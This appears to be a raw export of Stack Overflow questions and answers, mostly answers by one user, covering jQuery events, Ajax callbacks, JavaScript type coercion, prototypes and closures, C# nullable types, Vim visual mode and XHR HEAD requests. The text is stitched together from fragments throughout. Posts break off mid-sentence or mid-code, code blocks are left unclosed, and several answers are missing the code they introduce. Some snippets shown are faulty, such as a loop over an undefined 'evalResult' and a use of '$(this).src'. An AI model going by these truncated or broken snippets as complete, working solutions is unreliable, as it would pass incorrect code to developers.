		$(this).change(ochange);
		$(this).attr(""name"", ""select"" + numfields);
		$(this).attr(""id"", ""select"" + numfields);
	});
</code></pre>

<p>The event binds as expected, but the ""handle"" variable doesn't register (of course because I'm pretty sure this is incorrect syntax). Also, this function that I want to bind to the dynamic form element is actually already defined, so if there is a way I can call an already-defined function (that takes a parameter) I'd love to hear about it.</p>
","5445","","<p>The first parameter of an event handler function is the <a href=""https://developer.mozilla.org/en/DOM:event"" rel=""nofollow"">event object</a>.</p>

<p>If I understand correctly, basically you want to pass a value to the <code>ochange</code> function.</p>

<p>You could declare the variable <code>handle</code> in the scope of the <em>each</em> callback function, and use its value on the <code>ochange</code> function, since you have jQuery, you could use it in that function, and avoid the getElementById calls:</p>

  var handle = ""someValue""; // this variable will be accessible inside ochange

","5445","","<p>The <code>?</code> symbol after a type is only a shortcut to the <a href=""http://msdn.microsoft.com/en-us/library/1t3y8s4s%28VS.80%29.aspx"">Nullable type</a>, <code>bool?</code> is equivalent to <code>Nullable&lt;bool&gt;</code>.</p>

<p><code>bool</code> is a <a href=""http://msdn.microsoft.com/en-us/library/s1ax56ch.aspx"">value type</a>, this means that it cannot be <code>null</code>, so the Nullable type basically allows you to wrap value types, and being able to assign <code>null</code> to them. </p>

<p><code>bool?</code> can contain three different values: <code>true</code>, <code>false</code> and <code>null</code>.</p>

<p>Also, there are no short-circuiting operators (&amp;&amp; ||) defined for <code>bool?</code></p>

<p>Only the logical AND, inclusive OR, operators are defined and they behave like this:</p>

<pre><code>x        y      x &amp; y   x | y   
true    true	true	true
true    false	false	true
true    null	null	true
false   true	false	true
false   false	false	false
false   null	false	null
null    true	null	true
null    false	false	null
null    null	null	null
</code></pre>

<p>The Nullable type is basically a generic struct, that has the following public properties:</p>

<pre><code>public struct Nullable&lt;T&gt; where T: struct
{
    public bool HasValue { get; }
    public T Value { get; }
}
</code></pre>

<p>The <code>HasValue</code> property indicates whether the current object has a value, and the <code>Value</code> property will get the current value of the object, or if HasValue is false, it will throw an InvalidOperationException.</p>

<p>Now you must be wondering something, Nullable is a struct, a value type that cannot be null, so why the following statement is valid?</p>

<pre><code>int? a = null;
</code></pre>

<p>That example will compile into this:</p>

<pre><code>.locals init (valuetype [mscorlib]System.Nullable`1&lt;int32&gt; V_0)
IL_0000:  ldloca.s   V_0
IL_0002:  initobj    valuetype [mscorlib]System.Nullable`1&lt;int32&gt;
</code></pre>

<p>A call to <a href=""http://msdn.microsoft.com/en-us/library/system.reflection.emit.opcodes.initobj%28VS.85%29.aspx"">initobj</a>, which initializes each field of the value type at a specified address to a null reference or a 0 of the appropriate primitive type.</p>

<p>That's it, what's happening here is the default <a href=""http://msdn.microsoft.com/en-us/library/aa288208%28VS.71%29.aspx"">struct initialization</a>.</p>

","5445","","<p>The actual problem is in the following line:</p>

another text goes here . 
&lt;/div&gt;
</code></pre>

<p>so i get all text with jQuery like this:
var qtext = $('.someclass').text(); </p>

<p>but i don't want  <code>&lt;blockquote&gt;some text ! &lt;/blockquote&gt;</code> i just need the text inside div element . how can i filter that ? </p>

<p>tanks guys . </p>
","5445","","<p>What you want is only to select the TextNodes:</p>

<pre><code>var textNodes =   $('.someclass').contents()
                                 .filter(function() {
                                   return this.nodeType ==  Node.TEXT_NODE;
                                 });
</code></pre>

<p>That will give you an array of TextNodes, you could then  extract the actual text content of all the nodes to an array:</p>

<pre><code>var textContents = $.map(textNodes, function(n){return n.textContent;});

"<p>I am trying to make an accordion with JQuery and am running into some trouble. The JQuery website shows to create your accordion content like this.</p>

    &lt;div&gt;Second content&lt;/div&gt;
&lt;/div&gt;

<p>When I do this the accordion doesn't work right and something is wrong with the formatting. If I put h3 tags around the header anchors like so</p>

","5445","","<p>A couple of things that you could improve:</p>

<p>1 . Using each with an <a href=""http://docs.jquery.com/Selectors/id"" rel=""nofollow"">id selector</a>.</p>

<pre><code>$(""#""+&lt;?=$r['Attribute']['id'];?&gt;).each
</code></pre>

<p>Using <code>each</code> doesn't makes sense, since this selector will match a single element, and the element id must be unique.</p>

<p>2 . $.ajax for handling a JSON response</p>

<p>If you are doing an ajax request that returns JSON, the <a href=""http://docs.jquery.com/Ajax/jQuery.getJSON"" rel=""nofollow"">$.getJSON</a> function is the best way to go, you don't have to parse the responce, it will be safely evaluated by jQuery.</p>

<p>3 . Your request is synchronous.</p>

<p>I'm not against synchronous requests, but I think that you don't explicitly need it.</p>

<p>Finally, for your JSON response, you could easily flatten the result, using the <a href=""http://docs.jquery.com/Utilities/jQuery.map"" rel=""nofollow"">$.map</a> function for example:</p>

<pre><code>var data = {""choices"":[{""choice"":""Male""},{""choice"":""Female""}]};
$.map(data.choices, function(i){return i.choice;}); 
// returns [""Male"", ""Female""]

"<p>The background is that I've got a celery distributed job server configured with a Django view that returns the status of a running job in JSON.  The job server is located at celeryserver.mydomain.com and the page I'm executing the jQuery from is www.mydomain.com so I shouldn't need to consider JSONP for this should I,  as the requests aren't being made to different domains?</p>

<p>Watching my server logs I see that jQuery is executing the <code>getJSON</code> call every 3 seconds as it should (with the Javascript setInterval).  It does seem to use an OPTION request,  but I've confirmed using <code>curl</code> that the JSON is still returned for these request types.</p>

<p>The issue is that the <code>console.log()</code> Firebug call in the jQuery below doesn't ever seem to run!  The one before the getJSON call does.  Not having a callback work is a problem for me because I was hoping to poll for a celery job status in this manner and do various things based on the status of the job.</p>

<pre><code>&lt;script type=""text/javascript""&gt;
    var job_id = 'a8f25420-1faf-4084-bf45-fe3f82200ccb';

    // wait for the DOM to be loaded then start polling for conversion status
    $(document).ready(function() {
        var getConvertStatus = function(){
            console.log('getting some status');
            $.getJSON(""https://celeryserver.mydomain.com/done/"" + job_id,
                function(data){
                    console.log('callback works');
                });
        }
        setInterval(getConvertStatus, 3000);
    });
&lt;/script&gt;
</code></pre>

<p>I've used <code>curl</code> to make sure of what I'm receiving from the server:</p>

<pre><code>$ curl -D - -k -X GET https://celeryserver.mydomain.com/done/a8f25420-1faf-4084-bf45-fe3f82200ccb
HTTP/1.1 200 OK

</code></pre>

<p>That JSON looks fine to me and JSONlint.com validates it for me right now...  I also simulated the jQuery query with <code>-X OPTION</code> and got exactly the same data back from the server as with a GET (content-type of application/json etc.)</p>

<p>I've been staring at this for ages now,  any help greatly appreciated.  I'm a pretty new jQuery user but this seems like it should be pretty problem-free so I have no idea what I'm doing wrong!</p>

"<p>EDIT: I am also after advice if there is a better way to go about this??</p>

<p>I have a webpage that displays a timesheet for the user to fill out.
The timesheet is for a month so it has as many rows in the month
and also 5 columns of data, Normal hours, extended hours, shift hours
holidays hours and total.</p>

<p>I have a dropdown list that allows the user to select the month
and year textbox.</p>

<p>When they select a month the code then disbles the bottom
rows if they are not required due to not havving say 31 days as 
an example. It also then sets the background color of each
row depending on if it is a weekend( in a different color) or not.</p>

<p>Problem is when the month is selected it is taking 3-4 secs to 
run the code and is annoying for the user as they dont know
what is happening.</p>

<p>Is there any way of improving this that you can see? The code
is shown below.</p>

		MonthChange();
	});

<blockquote>
  <p>You can explicitly request Inserts by
  using InsertOnSubmit. Alternatively,
  LINQ to SQL can infer Inserts by
  finding objects connected to one of
  the known objects that must be
  updated. For example, if you add an
  Untracked object to an
  EntitySet(TEntity) or set an
  EntityRef(TEntity) to an Untracked
  object, you make the Untracked object
  reachable by way of tracked objects in
  the graph. While processing
  SubmitChanges, LINQ to SQL traverses
  the tracked objects and discovers any
  reachable persistent objects that are
  not tracked. Such objects are
  candidates for insertion into the
  database.</p>
</blockquote>

<p>I guess the question boils down to this - how do I change the deleted objects' state to 'Untracked'? </p>

<p>I tried DeleteOnSubmit after I delete the objects from list but that gives an exception (Cannot remove an entity that has not been attached).</p>

<p>Can someone please point me to a solution? Thanks. </p>

<p>I would like to know if I can achieve this using LINQ only. (I know that I can use an stored proc and insert only the records in the list.)</p>

<p>If your span elements are contained in other parent element, you can use this selector like <a href=""http://jsbin.com/idobu"" rel=""nofollow"">this</a>:</p>

"<p>I've heard a lot about <a href=""http://www.vim.org/"">Vim</a>, both pros and cons.
It really seems you should be (as a developer) faster with Vim than with any other editor.
I'm using Vim to do some basic stuff and I'm at best 10 times <em>less productive</em> with Vim.</p>

<p>The only two things you should care about when you talk about speed (you may not care enough about them, but you should) are:</p>

<ol>
<li>Using alternatively left and right
hands is the <strong>fastest</strong> way to use the
keyboard. </li>
<li>Never touching the mouse is the
second way to be as fast as possible.
It takes ages for you to move your hand,
grab the mouse, move it, and bring it
back to the keyboard (and you often have
to look at the keyboard to be sure you
returned your hand properly to the right place)</li>
</ol>

<p>Here are two examples demonstrating why I'm far less productive with Vim.</p>

<p><strong>Copy/Cut &amp; paste.</strong> I do it all the time. With all the contemporary editors you press <kbd>Shift</kbd>  with the left hand, and you move the cursor with your right hand to select text. Then <kbd>Ctrl</kbd>+<kbd>C</kbd> copies, you move the cursor and <kbd>Ctrl</kbd>+<kbd>V</kbd> pastes.</p>

<p>With Vim it's horrible:</p>

<ul>
<li><strong><code>yy</code></strong> to copy one line (you almost never want the whole line!)</li>
<li><strong><code>[number xx]yy</code></strong> to copy <code>xx</code> lines into the buffer. But you never know exactly if you've selected what you wanted. I often have to do <strong><code>[number xx]dd</code></strong> then <strong><code>u</code></strong> to undo!</li>
</ul>

<p>Another example? <strong>Search &amp; replace.</strong></p>

<ul>
<li>In <a href=""http://en.wikipedia.org/wiki/PSPad"">PSPad</a>: <kbd>Ctrl</kbd>+<kbd>f</kbd> then type what you want you search for, then press <kbd>Enter</kbd>.</li>
<li>In Vim: <strong><code>/</code></strong>, then type what you want to search for, then if there are some special characters put <strong><code>\</code></strong> before <em>each</em> special character, then press <kbd>Enter</kbd>.</li>
</ul>

<p>And everything with Vim is like that: it seems I don't know how to handle it the right way.</p>

<p>NB : <strong>I've already read the Vim <a href=""http://www.viemu.com/vi-vim-cheat-sheet.gif"">cheat</a> <a href=""http://www.fprintf.net/vimCheatSheet.html"">sheet</a></strong> :)</p>

<p>My question is:</p>

<p>What is the way you use Vim that makes you more productive than with a contemporary editor?</p>
","5445","","<p>You are talking about text selecting and copying, I think that you should give a look to the <a href=""http://www.vim.org/htmldoc/visual.html"">Vim Visual Mode</a>.</p>

<p>In the visual mode, you are able to select text using Vim commands, then you can do whatever you want with the selection.</p>

<p>Consider the following common scenarios:</p>

<p>You need to select to the next matching parenthesis.</p>

<p>You could do:</p>

<ul>
<li><strong><code>v%</code></strong> if the cursor is on the starting/ending parenthesis</li>
<li><strong><code>vib</code></strong> if the cursor is inside the parenthesis block</li>
</ul>

<p><img src=""http://dl.dropbox.com/u/35146/stackoverflow/Vim/parens.gif"" /></p>

<p>You want to select text between quotes:</p>

<ul>
<li><strong>vi""</strong> for double quotes </li>
<li><strong>vi'</strong> for single quotes</li>
</ul>

<p><img src=""http://dl.dropbox.com/u/35146/stackoverflow/Vim/quotes.gif"" /></p>

<p>You want to select a curly brace block (very common on C-style languages):</p>

<ul>
<li><strong><code>viB</code></strong></li>
<li><strong><code>vi{</code></strong></li>
</ul>

<p><img src=""http://dl.dropbox.com/u/35146/stackoverflow/Vim/viB.gif"" /></p>

<p>You want to select the entire file:</p>

<ul>
<li><strong><code>ggVG</code></strong> </li>
</ul>

<p><a href=""http://vimdoc.sourceforge.net/htmldoc/visual.html#CTRL-V"">Visual block selection</a> is another really useful feature, it allows you to select a rectangular area of text, you just have to press <kbd>Ctrl</kbd>-<kbd>V</kbd> to start it, and then select the text block you want and perform any type of operation such as yank, delete, paste, edit, etc. It's great to edit <em>column oriented</em> text.</p>

<p>I know it uses XMPP to send messages, but I do not know how to use this at all.

","5445","","<p>You are replacing the entire content of your <code>#pop_div</code>, when you insert HTML code, new DOM elements are being created, that's why the event is not binded.</p>

<p>But it gives me 24 instead of 6, what am I doing wrong?</p>
","5445","","<p>That is one of the ""<a href=""http://www.fishingforwater.net/archives/131"" rel=""nofollow"">Bad Parts</a>"" of JavaScript, as a loosely typed language, the addition and concatenation operator is overloaded.</p>

<p>JavaScript is loosely typed, but that doesn't mean that it has no data types just because a value of a variable, object properties, functions or parameters don't need to have a particular type of value assigned to it.</p>

<p>Basically there are three <em>primitive</em> data types:</p>

<ul>
<li>boolean</li>
<li>number</li>
<li>string</li>
</ul>

<p>null and undefined are two special cases, everything else are just variations of the object type.</p>

<p>JavaScript type-converts values of types into a type suitable for the context of their use (type coercion).</p>

<p>In your example were trying to add two objects of type string, so a concatenation occur.</p>

<p>You can ""cast"" or type convert the variables to <em>number</em> in many ways to avoid this problem:</p>

<pre><code>var a = ""2"";
var b = ""4"";
// a and b are strings!
var sum =  Number(a) + Number(b);          // Number constructor.
sum =  +a + +b;                            // Unary plus.
sum =  parseInt(a, 10) + parseInt(b, 10);  // parseInt.
sum =  parseFloat(a) + parseFloat(b);      // parseFloat.
</code></pre>

<p>This is I think a very common mistake, for example when reading user input from form elements, the value property of form controls is string, even if the character sequence that it contain represents a number (as in your example).</p>

<p>The ""Bad Part"" which I talk, is about the dual functionality of the + operator, overloaded to be used for both, numeric addition and string concatenation. </p>

<p>The operation that the + operator will do is determined completely by the context. Only if the both operands are numbers, the + operator perform addition, otherwise it will convert all of its operands to string and do concatenation.</p>

<p>But i think the challenge for me is to show the one that i choosed and to hide the other ones...
Thank u for the replies</p>

<p>Ive been trying to work out the Justin Johnson function, but it didnt work for internet explorer 7 and 8.</p>

<p>I will post the code for anyone that can help me.
Ive changed the <code>style.display = ""none""; for </code>style.cssText='display: none';<code> 
</code>but only worked when the page loaded. Now when i change the select box, nothing happens.</p>

<p>Here is the code(its big, i will optimize it with loops when this works):</p>

<pre><code>var attachEvento = function(node, event, listener, useCapture) {

  else {
    node.attachEvent('on'+event, listener);
  }

<li>Other corresponding select box becomes visible.</li>

<p>In your example I think you try to do an associative array, and you should use object, Array is not meant to be used for key/value pairs.</p>

<p>Also the array length is indirecly increased when you assign a value to an index with higher length of the current array length:</p>

array[99] = ""Test"";

<p>Given a needle and a haystack... I want to put bold tags around the needle. So what regex expression would I use with replace()? I want SPACE to be the delimeter and I want the search to be case insensitive and I want special characters (such as @!#.()) to be ignored in the search</p>

<p>so say the needle is ""cow"" and the haystack is</p>

<pre><code>cows, at www.cows.com, milk some COWS!
</code></pre>

<p>would turn into</p>

<pre><code>&lt;b&gt;cows&lt;/b&gt;, at www.cows.com, milk some &lt;b&gt;COWS&lt;/b&gt;!
</code></pre>

<p>also keywords should be able to have spaces in it so if the keyword is ""who is mgmt""...</p>

<pre><code>great band. who. is. mgmt btw?
</code></pre>

<p>would turn into</p>

<pre><code>great band. &lt;b&gt;who. is. mgmt&lt;/b&gt; btw?

<pre><code>function updateHaystack(input, needle) {
    return input.replace(new RegExp('(^|\\s)(' + needle + ')(\\s|$)','ig'), '$1&lt;b&gt;$2&lt;/b&gt;$3');
}
</code></pre>

<p>unfortunately it doesn't bold words that are concatenated with a special char... eg. !cow does not turn into <code>!&lt;b&gt;cow&lt;/b&gt;</code></p>

<p>Thank you</p>
","5445","","<p>Allow any non-whitespace character to be part of the needle:</p>

","5445","","<p>Basically in the first example you declare an <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FGuide/Literals#Object%5FLiterals"" rel=""nofollow"">object literal</a> which is actually already an object instance.</p>

<p>In your second example, you define a constructor function which can be used with the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Operators/Special%5FOperators/new%5FOperator"" rel=""nofollow""><code>new</code></a> operator to create object instances.</p>

<p>Object literals can be also used to create new instances of objects and do prototypal inheritance, Douglas Crockford promotes also this technique.</p>

<p>Basically you can have an <code>object</code> operator: </p>

<pre><code>function object(o) {
    function F() {}
    F.prototype = o;
    return new F();
}
</code></pre>

<p>This helper function can be used in a very intuitive and convenient way.</p>

<p>It basically receive an object as a parameter, inside the function a <em>new object instance</em> is created, the old object is <em>chained</em> to the new object's prototype, and its returned.</p>

<p>It can be used like this:</p>

<pre><code>var oldObject = {
  firstMethod: function () { alert('first'); },
  secondMethod: function () { alert('second'); },
};

var newObject = object(oldObject);
newObject.thirdMethod = function () { alert('third'); };

var otherObject = object(newObject);
otherObject.firstMethod();
</code></pre>

<p>You can go further as you want, making new instances from the previously defined objects.</p>

","5445","","<p>In your <em>option 1</em> you are returning from the callback function, and its return value is never used because this function is only called when the Ajax request ends.</p>

<p>In the <em>option 2</em>, you are returning from your main function, but that return happens before the callback function assign any value to your <code>valid</code> variable.</p>

<p>I would refactor your code in this way, without using global variables:</p>

  $.post('/path/to/url/',{
    'username': username,

    var valid = data != 0;

    alert(username);
    alert(valid);

    otherFunction(username, valid);

","5445","","<p>Ajax requests are executed asynchronously, the callback function (<code>function (data)</code>) of getJSON is executed when the request ends, and returning a value in that callback has no effect, because is a nested function inside getPosts and its return value is never used.</p>

<p>Actually in your example, getPosts doesn't return anything and it ends its execution <em>before</em> the data is returned.</p>

<p>I would recommend you to work on your submit event handler, if you want to keep the getPosts function, you can introduce a callback parameter:</p>

<pre><code>$('form#getSome').submit(function(){
  var str = $(""form#getSome"").serialize();

  getPosts(str, function (data) {

<p><strong>Edit 2:</strong> In response to your second comment, you could make another callback, that will be executed when the data has been processed by the first callback, and you can define it when you execute the getPosts function on the submit event handler:</p>

","5445","","<p>I like <a href=""http://ejohn.org/blog/javascript-array-remove/"">this implementation</a> of Array.remove, it basically abstracts the use of the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/Array/splice"">splice</a> function:</p>

","5445","","<p>Use an anonymous function instead of a string on the first parameter of the <a href=""https://developer.mozilla.org/en/DOM/window.setTimeout"">setTimeout</a> or <a href=""https://developer.mozilla.org/en/DOM/window.setInterval"">setInterval</a> functions:</p>

<pre><code>// assuming that object_array is available on this scope

<p><em>Why it works:</em></p>

<p>When you define an inner function, it can refer to the variables present in their
outer enclosing function even after their parent functions have already terminated.</p>

<p>This language feature is called <a href=""http://www.javascriptkit.com/javatutors/closures.shtml"">closures</a>.</p>

<p>If you pass a string as the first argument of these functions, the code will be executed internally using a call to the  <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FFunctions/eval"">eval</a> function, and doing this is <strong>not</strong> considered as a <a href=""http://www.jslint.com/lint.html#evil"">good practice</a>.</p>

<p>Eval provides direct access to the JavaScript compiler and executes the code it's passed with the privileges of the caller, also using eval <em>repeatedly/extensively</em> (i.e. your setInterval function is a good example) will lead to performance issues.</p>

<p>That operator creates a new object that inherits from the prototype of the operand constructor function, and then it calls the function, assigning the new object to <code>this</code>.</p>

<p>If you forget to use the new operator when calling a constructor function, you get instead normal function call, and <code>this</code> is bound to the global object (<code>window</code>) instead of to a new object.</p>

<p>Your function will be appending global variables whenever it uses <code>this</code> attempting to initialize its own instance.</p>

<p>In your example the global object ends up with two new variables:</p>

<pre><code>window.foo
window.bar
</code></pre>

<p>Because of that some people prefer <a href=""http://javascript.crockford.com/prototypal.html"" rel=""nofollow"">prototypal inheritance</a> instead of the pseudo-classical approach.</p>

"<p>I know the defined behavior for web forms is to not submit disabled fields... but that's not the definition I want.  I want to use ajax to post the form and I want it to get all fields, even if they are disabled.  I don't want to build a workaround where I make the field ""look disabled""... or have to hack it where I enable the fields -> post -> disable.</p>

<p>is it possible to make ajaxSubmit() or serialize() grab the disabled fields as it's moving through the DOM and grabbing values?  or is there another serialize plugin out there that can do this?  or does someone have a mod I can make to one of these plugins to make it work?</p>

<p>or am I doomed to hack it?</p>
","5445","","<p>You can make your fields <a href=""http://www.w3.org/TR/html401/interact/forms.html#adef-readonly"">readonly</a>, this will disallow changes to the value of your controls.</p>

<p><strong>Edit:</strong> You could easily write a ""<em>serializeDisabled</em>"" function, iterating over the disabled form elements which have a name attribute and using the <a href=""http://docs.jquery.com/Utilities/jQuery.param"">jQuery.param</a> function at the end, to generate the serialized string:</p>

"<p>I am creating an Image gallery and i want a few images to load when the next button is clicked.....<br>
for example,<br></p>

<pre><code>$(""#next"").css({cursor:""pointer""}).click(function(){
			//load image1,image2,image3
		});

<p>i don't want to append them to a division, these image tags are already present in 'gallery' div tag... I just want to stop them from loading when the page loads at first and when the user clicks on next button theses images can load ...Thanks</p>
","5445","","<p>If the images elements are already in your markup, and they have the <code>src</code> attribute defined, the image files will be downloaded when the page starts loading.</p>

<p>You should either create the image elements programmatically or leave the <code>src</code> attribute empty on your markup, and then assign it when the user clicks next.</p>

<p>Option 1:</p>

<pre><code>// on the click event...
var images = ['img1.jpg', 'img2.jpg', 'img3.jpg'],
    gallery = $('#gallery');
$.each(images, function () {
  $('&lt;img/&gt;').attr('src', this).appendTo(gallery);
});

<p>Option 2:</p>

<p>Markup:</p>

<pre><code>&lt;img id=""img1""/&gt; &lt;img id=""img2""/&gt; &lt;img id=""img3""/&gt;

<p>On the click event:</p>

<pre><code>$('#img1').attr('src', 'image1.jpg');
$('#img2').attr('src', 'image2.jpg');
$('#img3').attr('src', 'image3.jpg');
</code></pre>

<p><strong>Edit:</strong></p>

<p>Another option comes to my mind when you talk about lazy loading.</p>

<p><em>Option 3:</em></p>

<p>You could remove the src attribute of your images, and store it using the <a href=""http://docs.jquery.com/Core/data"" rel=""nofollow"">$.data</a> function, then in your click event, restore the image src to its original value, for example:</p>

<pre><code>$(function () {
  // put a ""defaultImage"" on all images of gallery
  // and store the original src attribute
  $('#gallery img').each(function () {
    $(this).data('originalSrc', $(this).src).attr('src', 'defaultImage.jpg');
  });

  $(""#next"").click(function(){
    $('#gallery img').each(function () {
      // restore the original src attribute:
      $(this).attr('src', $(this).data('originalSrc'));

"<p>I've got a bunch of checkboxes generated by an asp.net CheckBoxList control. I want to get the text the user sees next to the control on the page. </p>

<p>With similar controls, like RadioButtonList, I've been able to get their values in jQuery by doing this:</p>

<pre><code>var selected = $(""input:checked[id*='"" + Control.id + ""']"");
</code></pre>

<p>and then looping through and getting the value:</p>

<pre><code>var whatIwant = selections[i].value;
</code></pre>

<p>(In this case, that ""value"" will be the text I want).</p>

<p>But - CheckBoxList renders differently. For each ListItem there's not only the input, but an html  tag like so:</p>

<pre><code>&lt;input id=""ctl00_ContentPlaceHolder1_ConsultedList_0"" type=""checkbox"" name=""ctl00$ContentPlaceHolder1$ConsultedList$0"" /&gt;
&lt;label for=""ctl00_ContentPlaceHolder1_ConsultedList_0""&gt;Other service providers&lt;/label&gt;
</code></pre>

<p>As you can see, the input tag itself, which is what my nice little jQuery query finds, doesn't include the info I want: ""Other service providers"". That's on the label tag.</p>

<p>Can anyone think of a good solution for this - maybe a good way of making the CheckBoxList render the text I need in the input tag, or some clever jQuery to find the labels that correspond to the <em>selected</em> inputs? </p>
","5445","","<p>You will have to iterate over your form elements, searching for the label and grab its inner text, ASP .NET wraps the checkboxes inside a table with the ClientID of the control, you can use a selector like the following:</p>

<pre><code>  var selection = [];
  $('#&lt;%= CheckBoxList.ClientID %&gt; :checked').each(function () {
    selection.push($(this).next('label').text());
  });
</code></pre>

<p>The HTML rendered by ASP .NET for CheckBoxLists looks like this:</p>

<pre><code>&lt;table id=""check1"" border=""0""&gt;
    &lt;tr&gt;
    	&lt;td&gt;&lt;input id=""check1_0"" type=""checkbox"" name=""check1$0"" /&gt;
                &lt;label for=""check1_0""&gt;Item 1&lt;/label&gt;&lt;/td&gt;

<p>I'm going to change the question a bit.. I didn't explain it well the first time through. </p>

<p>How do I declare static variables in a class?</p>

<p>I know with java it's simple, you just put static infront of the variable type and presto you've got a static variable. I can't seem to find that option for javascript..</p>
","5445","","<p>Since you want to use the instance of the object inside of your method, I think that you are not really wanting to create a <em>static method</em>, what you want, is a method that is applicable and accessible by all the instances.</p>

<p>For doing that you can extend the constructor's <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Global%5FObjects/SyntaxError/prototype"" rel=""nofollow"">prototype</a>:</p>

<pre><code>function MyClass() {
   this.pubVar = 'hello public';
   var priVar = 'hello private';
}

MyClass.prototype.myMethod = function() {
   alert(this.pubVar);
}


var instance = new MyClass();
instance.myMethod(); // alerts 'hello public'
</code></pre>

<p>When you extend the prototype of a constructor function, all the members that reside on it, will be inherited to the object instances created with the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Operators/Special%5FOperators/new%5FOperator"" rel=""nofollow"">new</a> operator.</p>

<p>So you define this method only once in your constructor function, and it will be accessible in the context of each instance (the <a href=""https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Operators/Special%5FOperators/this%5FOperator"" rel=""nofollow"">this</a> keyword inside the method refers to the object instance).</p>

<p>EDIT:  I've gotten it to work, but it still requires me to use eval, here's my solution which works for me:</p>

<pre><code>function onGetComboBoxOneContents(msg) {
    var evalResult = eval(msg.d);

    var cbo = $(""#"" + getComboFilterOneObject);
    ClearComboBox(cbo);

    }
    cbo.initializeOptionList();
}
</code></pre>
","5445","","<p>Since you are using jQuery and specifying the type of the result as json, you don't need to parse or evaluate anything, jQuery will safely evaluate the response as JSON and return a JavaScript Object.</p>

<p>On your callback you can access directly to the object, like this:</p>

<pre><code>function onGetComboBoxOneContents(msg) {
    var cbo = getComboFilterOneObject;
    ClearComboBox(cbo);

    for (var i = 0; i &lt; evalResult.d.length; i++) {
        AddToComboBox(cbo, msg.d[i].Value, msg.d[i].Text);
    }
}

<p><strong>Edit:</strong> I see what is the problem now, JavaScript is case sensitive, in your Ajax request you are setting the datatype option, not data<strong>T</strong>ype, that's why jQuery is returning you a string:</p>

"<p>I want to make a constructor function that creates a documentElement object.</p>

<p>As an example, consider the new Audio() constructor - it creates a documentElement object, and if you pass it some variables it populates the new documentElement with attributes.  It doesn't insert it into the DOM, it simply creates the object.</p>

<p>So, the question is - what makes a documentElement different from a vanilla javascript object (of the {property: value} kind), and can you write constructors for them like you can for objects?</p>

<p>Edit:</p>

<p>What I'm toying with is re-creating the new Audio() constructor in browsers that don't have it, using a quicktime or flash HTMLObjectElement in place of the HTMLAudioElement.</p>

<p>It's ok with me that audio.constructor will refer to HTMLObjectElement, as the result of using new Audio() in browsers that support it, is that audio.constructor refers to HTMLAudioElement.</p>

<p>I'm not sure about the Audio.prototype.  When I query console.log(Audio.prototype) in browsers with Audio support, they return nothing at all - not even an empty line in console.log - so that's got me stumped. If I understand right, though, it doesn't affect what I'm aiming to do.</p>

<p>The aim is to be able to code using the Audio constructor, and have the browser handle it natively or set up a plugin instance if it needs to.</p>

     body = document.createElementNS('http://www.w3.org/1999/xhtml', 'body');  

  doc.documentElement.appendChild(body);  
  return doc;
}

<p><strong>Edit:</strong></p>

<p>Do you mean something like this?</p>

document.body.appendChild(anchor);
// &lt;a id=""myLink"" href=""http://google.com""&gt;Link text&lt;/a&gt;
</code></pre>

<p>However I don't see too much advantage of using a constructor function for that.</p>

<p>The element is returned from the constructor function, the object <code>instance</code> is lost, <code>anchor.constructor</code> in the above example refers to <code>HTMLAnchorElement</code> instead of <code>ElementCreator</code>, and for that the access to the <code>ElementCreator.prototype</code> is also lost.</p>

<p>It would make more sense if the DOM Element instance is wrapped on a member, or just implement a simple function.</p>

<p>Now to get the file size, now I can only think about the <a href=""http://msdn.microsoft.com/en-us/library/ms533752%28VS.85%29.aspx"">fileSize property</a> that Internet Explorer exposes for document and <a href=""http://msdn.microsoft.com/en-us/library/ms535259%28VS.85%29.aspx"">IMG</a> elements...</p>

<p><strong>Edit 2:</strong> Something comes to my mind... </p>

<p>To get the size of a file hosted on the server, you could simply make an <a href=""http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.4"">HEAD HTTP Request</a> using Ajax. This kind of request is used to obtain metainformation about the url implied by the request without transferring any content of it in the response.</p>

<p>At the end of the HTTP Request, we have access to the response HTTP Headers, including the <a href=""http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.13"">Content-Length</a> which represents the size of the file in bytes.</p>

<p>A basic example using raw <a href=""http://www.w3.org/TR/XMLHttpRequest/"">XHR</a>:</p>

<pre><code>var xhr = new XMLHttpRequest();
xhr.open('HEAD', 'img/test.jpg', true);
xhr.onreadystatechange = function(){
  if ( xhr.readyState == 4 ) {
    if ( xhr.status == 200 ) {
      alert('Size in bytes: ' + xhr.getResponseHeader('Content-Length'));
    } else {
      alert('ERROR');
    }
  }
};
xhr.send(null);
</code></pre>

<p><strong>Note:</strong> Keep in mind that when you do Ajax requests,  you are restricted by the <a href=""http://en.wikipedia.org/wiki/Same_origin_policy"">Same origin policy</a>, which allows you to make requests only within the same domain.</p>

<p>Check a working proof of concept <a href=""http://jsbin.com/izojo"">here</a>.</p>

<p><strong>Edit 3:</strong></p>

<p>1.) About the Content-Length, I think that a size mismatch could happen for example if the server response is gzipped, you can do some tests to see if this happens on your server.</p>

<p>2.) For get the original dimensions of a image, you could create an IMG element programmatically, for example:</p>

<pre><code>var img = document.createElement('img');

img.onload = function () { alert(img.width + ' x ' + img.height); };

img.src='http://sstatic.net/so/img/logo.png';

<p>Another approach, just for ""functional fun"", since <em>I wouldn't recommend it</em> for performance, could be to separate the x and y values to two arrays using <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Array/map"" rel=""nofollow"">Array.map</a>, and then call the min and max functions with <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Function/apply"" rel=""nofollow"">apply</a>:</p>

minY = Math.min.apply(Math, allY);
maxX = Math.max.apply(Math, allX);
maxY = Math.max.apply(Math, allY);

<p>How this works? </p>

<p>The <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Function/apply"" rel=""nofollow"">apply</a> function is used to call another function, with a given context and arguments, provided as an array. The min and max functions can take an arbitrary number of input arguments: Math.max(val1, val2, ..., valN)</p>

<p>So if we call:</p>

<pre><code>Math.min.apply(Math, [1,2,3,4]);
</code></pre>

